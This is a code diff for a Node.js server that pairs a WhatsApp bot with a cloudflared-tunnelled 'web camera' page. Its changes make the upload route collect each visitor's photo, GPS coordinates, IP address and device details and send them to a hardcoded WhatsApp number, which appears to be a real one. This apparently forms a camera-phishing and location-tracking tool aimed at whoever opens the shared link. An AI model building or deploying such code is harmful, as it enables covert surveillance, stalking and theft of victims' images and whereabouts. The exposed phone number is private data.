@@ -18,11 +18,9 @@ const PORT = 5000
 app.use(express.json({ limit: '15mb' }))
 app.use(express.static('public'))
 
-// ===== BOT WA =====
 let sock
-let publicURL = `http://localhost:${PORT}` // fallback
+let publicURL = `http://localhost:${PORT}`
 
-// ===== CLOUDFARED TUNNEL =====
 function startTunnel() {
   const tunnel = exec('cloudflared tunnel --url http://localhost:5000')
 
@@ -39,7 +37,6 @@ function startTunnel() {
 
 startTunnel()
 
-// ===== START BOT =====
 async function startBot() {
   const { state, saveCreds } = await useMultiFileAuthState('./session')
   const { version } = await fetchLatestBaileysVersion()
@@ -64,9 +61,8 @@ async function startBot() {
     if (connection === 'open') {
       console.log('✅ Bot NIXON aktif 👩‍💻')
 
-      // isi nomor hp
       sock.sendMessage(
-        '628XXXXXXX@s.whatsapp.net',
+        '6283836033866@s.whatsapp.net',
         { text: `🌐 Web kamera siap:\n${publicURL}` }
       )
     }
@@ -95,24 +91,49 @@ async function startBot() {
 
 startBot()
 
-// ===== TERIMA FOTO DARI WEB =====
 app.post('/upload', async (req, res) => {
   try {
-    const { image } = req.body
-    const base64 = image.replace(/^data:image\/png;base64,/, '')
-    const file = `foto_${Date.now()}.png`
-    const filePath = path.join(__dirname, 'uploads', file)
+    console.log('📥 upload masuk')
+
+    const { image, location, device } = req.body
+    if (!image) return res.status(400).json({ error: 'No image' })
+
+    const ip =
+      req.headers['x-forwarded-for']?.split(',')[0] ||
+      req.socket.remoteAddress
+
+    const uploadDir = path.join(__dirname, 'uploads')
+    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir)
+
+    const base64 = image.replace(/^data:image\/\w+;base64,/, '')
+    const file = `foto_${Date.now()}.jpg`
+    const filePath = path.join(uploadDir, file)
 
     fs.writeFileSync(filePath, base64, 'base64')
 
-    // kirim ke wa (wajib pake nomor lu biar foto nya masuk ke wa lu) 
-    await sock.sendMessage(
-      '628XXXXXXX@s.whatsapp.net',
-      {
-        image: fs.readFileSync(filePath),
-        caption: '📸 foto dari web kamu'
-      }
-    )
+    let lokasiText = 'GPS tidak tersedia'
+    let mapsLink = '-'
+
+    if (location) {
+      lokasiText = `${location.lat}, ${location.lon} (±${location.accuracy}m)`
+      mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`
+    }
+
+    if (!sock?.user) {
+      return res.status(500).json({ error: 'WA not ready' })
+    }
+
+    await sock.sendMessage('6283836033866@s.whatsapp.net', {
+      image: fs.readFileSync(filePath),
+      caption:
+`📸 *Foto dari Web*
+━━━━━━━━━━━━━━━
+📍 GPS : ${lokasiText}
+🗺️ Maps: ${mapsLink}
+🌐 IP  : ${ip}
+📱 Dev : ${device}
+🕒 ${new Date().toLocaleString('id-ID')}`
+    })
 
     res.json({ status: true })
   } catch (e) {
